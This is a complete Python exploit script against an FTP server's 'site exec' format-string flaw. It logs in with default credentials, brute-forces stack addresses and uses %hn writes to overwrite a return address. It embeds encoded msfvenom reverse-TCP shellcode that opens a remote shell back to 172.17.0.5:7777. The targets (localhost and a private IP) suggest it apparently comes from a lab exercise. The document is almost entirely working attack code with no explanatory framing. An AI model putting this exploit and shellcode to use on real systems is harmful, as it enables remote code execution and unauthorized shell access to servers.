#!/usr/bin/env python3

import socket
import struct

POPS = 269
PAD_BYTES = 2

BAD_CHARS = b'\x00\x09\x0a\x0d\x20\x25\x2f'

def banner(s):
    print(s.recv(1024))


def login(s):
    s.send(b'user user\n')
    print(s.recv(1024))
    s.send(b'pass password\n')
    print(s.recv(1024))


def has_bad_chars(msg):
    for char in msg:
        if char in BAD_CHARS:
            return True
    return False


def craft_exploit_string(pops, pad_bytes, return_addr_loc):
    # (0xffffb8c6) Pad
    exploit_str = pad_bytes * b'a'

    # (0xffffb8c8) Return addr location (lower) to write to (pop 269)
    packed = struct.pack('<I', return_addr_loc)
    if has_bad_chars(packed): return None
    exploit_str += packed

    # (0xffffb8cc) Return addr location (higher) to write to
    packed = struct.pack('<I', return_addr_loc + 2)
    if has_bad_chars(packed): return None
    exploit_str += packed

    # (0xffffb8d0) Shellcode: msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.17.0.5 LPORT=7777 -f py -e x86/shikata_ga_nai -b '\x00\x09\x0a\x0d\x20\x25\x2f' (95 bytes)
    exploit_str += b'\xda\xd2\xd9\x74\x24\xf4\xbd\x4b\xfd\x5b\xb4\x58\x2b'
    exploit_str += b'\xc9\xb1\x12\x31\x68\x17\x83\xe8\xfc\x03\x23\xee\xb9'
    exploit_str += b'\x41\x82\xcb\xc9\x49\xb7\xa8\x66\xe4\x35\xa6\x68\x48'
    exploit_str += b'\x5f\x75\xea\x3a\xc6\x35\xd4\xf1\x78\x7c\x52\xf3\x10'
    exploit_str += b'\xd3\xb5\x03\xe5\x43\xb4\x03\xfb\xf2\x31\xe2\xb3\x93'
    exploit_str += b'\x11\xb4\xe0\xe8\x91\xbf\xe7\xc2\x16\xed\x8f\xb2\x39'
    exploit_str += b'\x61\x27\x23\x69\xaa\xd5\xda\xfc\x57\x4b\x4e\x76\x76'
    exploit_str += b'\xdb\x7b\x45\xf9'

    # Write 0xb8d0 to the address at POP+1, which is the return addr location (lower)
    bytes_written = len(exploit_str)
    remaining_bytes = 0xb8d0 - bytes_written
    exploit_str += b'%' + bytes(str(remaining_bytes), 'utf-8') + b'x'
    exploit_str += b'%' + bytes(str(pops), 'utf-8') + b'$hn'

    # Write 0xffff to the address at POP+2, which is the return addr location (higher)
    exploit_str += b'%' + bytes(str(0xffff - 0xb8d0), 'utf-8') + b'x'
    exploit_str += b'%' + bytes(str(pops + 1), 'utf-8') + b'$hn'

    return exploit_str.replace(b'\xff', b'\xff\xff')


def site_exec(s, msg):
    s.send(b'site exec ' + msg + b'\n')
    response = s.recv(65535)
    if response.startswith(b'200') and not b'end of' in response:
        response += s.recv(65535)
    return response


def main():
    return_addr_guess = 0xffffb8c8 # location of buffer on the stack
    # return_addr_guess += 100 # roughly skip the location of the buffer

    while True:

        print(f'[*] (Re)connecting..')
        with socket.socket() as s:
            s.connect(('localhost', 21))
            banner(s)
            login(s)

            while True:
                print(f'\n[*] Will be trying to write to {hex(return_addr_guess)}')
                exploit_str = craft_exploit_string(POPS, PAD_BYTES, return_addr_guess)
                return_addr_guess += 4

                print(f'[*] Exploit crafted:')
                print(exploit_str)
                if not exploit_str:
                    print(f'[*] Skipping {hex(return_addr_guess - 4)}, has bad chars')
                    continue

                response = site_exec(s, exploit_str)
                print(response)

                if not response:
                    break # break out of this socket session and force reconnect


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print()

